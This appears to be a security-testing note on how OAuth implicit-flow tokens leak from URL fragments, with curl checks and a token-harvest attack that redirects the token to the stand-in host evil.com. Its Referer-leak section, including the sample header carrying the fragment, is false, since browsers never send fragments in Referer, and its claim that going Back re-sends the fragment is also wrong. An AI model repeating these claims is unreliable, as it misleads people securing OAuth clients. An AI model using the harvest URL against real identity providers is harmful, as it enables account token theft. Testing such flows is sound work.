# Implicit flow — the fragment leak surface

`response_type=token` or `id_token` returns the token in the URL fragment.
The fragment never reaches the server, but it lives in the browser history,
in the `Referer` header of subresource requests, and in DOM access. A token
in the fragment is a token that leaks.

## Why implicit exists

The implicit flow was designed for browser-based apps (SPAs) that could not
hold a `client_secret`. The token is delivered directly to the browser —
no server-side exchange. The tradeoff: the token is exposed to the browser
environment, which is less trustworthy than a server-side exchange.

## The leak surfaces

| Surface | How the token leaks |
|---|---|
| browser history | the callback URL with `#access_token=...` is in history |
| `Referer` header | a subresource the callback page loads carries the fragment in `Referer` |
| DOM access | `window.location.hash` is readable by any script on the page |
| `postMessage` | a token in the fragment is posted to another frame or window |
| `sessionStorage`/`localStorage` | the app stores the token — readable by any same-origin script |

## The detection shape

```bash
# does the IdP accept implicit flow for this client?
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://app/callback&response_type=token&state=XYZ&nonce=N"
# if it 302s to https://app/callback#access_token=...&token_type=Bearer&expires_in=...
# the fragment is live
```

## The fragment-harvest attack

The attacker registers `redirect_uri=https://evil.com/callback` (via loose
validation) and coerces the app into implicit flow. The token is delivered to
the attacker's endpoint in the fragment — readable by JS on the page.

```bash
# the authorize URL that delivers the token to the attacker
curl -i "https://idp/authorize?client_id=APP&redirect_uri=https://evil.com/callback&response_type=token&state=XYZ&nonce=N"
# the 302 lands on https://evil.com/callback#access_token=...
# a script on evil.com reads window.location.hash and exfiltrates the token
```

## The Referer leak

The callback page loads a subresource (an image, a script, an analytics
beacon). The `Referer` header carries the full URL — including the fragment
with the token.

```html
<!-- the callback page loads a tracking pixel -->
<img src="https://analytics.example.com/pixel">
<!-- the browser sends Referer: https://app/callback#access_token=ABC&token_type=Bearer -->
```

## The history attack

The user clicks Back after the callback. The browser re-requests the callback
URL — including the fragment. If the app does not clear the fragment or
redirect to a clean URL, the token is re-exposed.

## The `form_post` response mode

`response_mode=form_post` delivers the token in a POST body instead of the
fragment. The POST body is not in the URL, so it does not leak via history or
Referer. But it is in the response body — readable by a same-origin script,
and it can be intercepted by a man-in-the-middle if the transport is not TLS.

```bash
# check whether form_post is accepted
curl -i -X POST "https://idp/authorize" \
  -d "client_id=APP&redirect_uri=https://app/callback&response_type=token&response_mode=form_post&state=XYZ&nonce=N"
```

## Falsifier

`response_type` is allowlisted to `code` only — the implicit flow is not
accepted. When this holds, the fragment leak closes — move to the code flow
or token binding.
